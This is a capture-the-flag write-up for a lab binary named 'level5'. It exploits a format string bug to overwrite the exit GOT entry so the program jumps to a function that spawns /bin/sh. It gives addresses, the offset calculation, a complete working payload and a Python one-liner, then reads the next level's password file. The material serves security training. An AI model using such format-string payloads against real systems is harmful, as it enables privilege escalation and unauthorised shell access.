---

## Phase 1: Reconnaissance

We find a binary `level5` in our home folder

---

## Phase 2: Static Analysis

Using Ghidra, we identify the main vulnerable function:

```c
void n(void)
{
    char buffer[520];
    fgets(buffer, 512, stdin);
    printf(buffer);
    exit(1);
}

- - - - - - - - - - - - - - -

void o(void)
{
    system("/bin/sh");
    _exit(1);
}
```

This level contains the same vulnerability as the previous one  
A format string vulnerability through `printf(buffer)`

However, this time we are not modifying a variable  
We are modifying a GOT entry

---

## Phase 3: The Plan

Function `n()` will always call:

    exit(1);

So the idea is simple:

- `n()` will always call `exit(1)` after `printf(buffer)`

- We want to overwrite `exit@GOT` (0x08049838) to point to `o()` (0x080484a4)

- So that when `exit(1)` happens, it jumps into `o()` = runs /bin/sh

- So our target is `exit@GOT`(0x08049838)

---

## Phase 4: Finding the Addresses

Using:

    objdump -R ./level5
    08049838 R_386_JUMP_SLOT   exit

This means:

    exit@GOT = 0x08049838

Next, we find the address of `o()`:

    objdump -d ./level5 | grep " <o>:"
    080484a4 <o>:

So:

    o() = 0x080484a4

---

## Phase 5: Finding the Offset

Running `AAAA.%08x.%08x.%08x.%08x.%08x` we get:

```bash
AAAA.00000200.002e0ac0.001257d0.41414141.3830252e
```

This indicates an offset of 4 (`%4$hn`)

---

## Phase 6: Planning The Exploit

We need to overwrite:

    exit@GOT (0x08049838)

With:

    o() (0x080484a4)

We need to split 0x080484a4 into two halves:

Upper 2 bytes:
    0x0804  = 2052

Lower 2 bytes:
    0x84a4  = 33956

We ALWAYS write the smaller half first (0x0804)

So:
1. Write 0x0804 into exit()+2
2. Write 0x84a4 into exit()

---

## Phase 7: Writing the Exploit

Addresses in little endian:

    exit+2 = 0x0804983a = \x3a\x98\x04\x08
    exit   = 0x08049838 = \x38\x98\x04\x08

Payload begins with:

    [exit+2][exit]

Those 8 bytes from the addresses are already printed
So the counter already starts at 8

---

#### First Write (0x0804)

We want the counter to be 2052 at the moment of the first `%hn`

Because we already have an address, we already start the counter with 8 chars

So we must print:
- `2052 - 8 = 2044` characters with `%2044c`

This makes `%hn` write `0x0804` in `exit()+2`


---

#### Second Write (0x84a4)

Now current count = 2052

We want it to become 33956

- `33956 - 2052 = 31904 ` characters with `%31904c`

This makes `%hn` write `0x84a4` in `exit()`

---

#### Final Payload

    "\x3a\x98\x04\x08\x38\x98\x04\x08%2044c%4$hn%31904c%5$hn"

---

## Phase 8: Exploit

Since we're not allowed to write in /tmp/ in this level, we will just use a python one liner

```shell
(python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044c%4$hn%31904c%5$hn"'; cat) | ./level5
```

When exit(1) executes, it jumps into o() instead

---

## Phase 9: Result

    whoami
    level6

We then retrieve the flag:

    cat /home/user/level6/.pass


